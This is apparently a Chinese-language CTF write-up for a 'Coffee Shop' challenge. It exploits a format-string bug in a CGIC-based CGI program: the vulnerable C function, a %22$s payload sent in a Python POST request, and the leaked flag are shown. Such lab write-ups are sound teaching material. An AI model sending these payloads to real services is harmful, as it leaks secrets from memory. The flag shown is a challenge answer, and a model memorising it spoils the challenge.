# Coffee Shop

## 题目简述

Apache 通过 CGIC 库运行一个 64 位 CGI 程序。表单字段 `name` 被直接作为 `fprintf` 的格式字符串；进程同时从环境变量 `FLAG` 取得 flag 指针并把它保留在栈帧中，因此可以用位置参数格式化字符串读取该指针指向的内容。

## 解题过程

漏洞位于 `Name`：

```c
void Name() {
    char name[81];
    cgiFormStringNoNewlines("name", name, 81);
    fprintf(cgiOut, name);
    fprintf(cgiOut, " ");
}
```

应先提交 `%p`、`%1$p`、`%2$p` 等探测栈参数。结合官方调试栈布局，位置 22 保存了指向环境变量 flag 字符串的指针，因此用 `%22$s` 让 `fprintf` 把它当作 C 字符串输出。

表单请求可以直接写成：

```python
import requests

response = requests.post(
    base_url + "/cgi-bin/test.cgi",
    data={
        "name": "%22$s",
        "coffees": "2",
        "submitbtn": "Submit order",
    },
)
print(response.text)
```

若手写 `application/x-www-form-urlencoded` 请求体，`%22$s` 应编码为 `name=%2522%24s`，经 CGIC 解码后才恢复原格式串。本地为 CGI 设置同名环境变量并执行随附二进制，响应正文实际出现：

```text
grey{cgi_bins_r_rly_cool} ordered 2 coffees.
```

## 方法总结

格式化字符串漏洞不只用于写内存；当敏感字符串指针已经位于可达参数槽时，位置参数 `%n$s` 是最直接的任意地址间接读取原语。通过逐项 `%n$p` 探测定位，再切换为 `%n$s` 即可。最终 flag 为 `grey{cgi_bins_r_rly_cool}`。
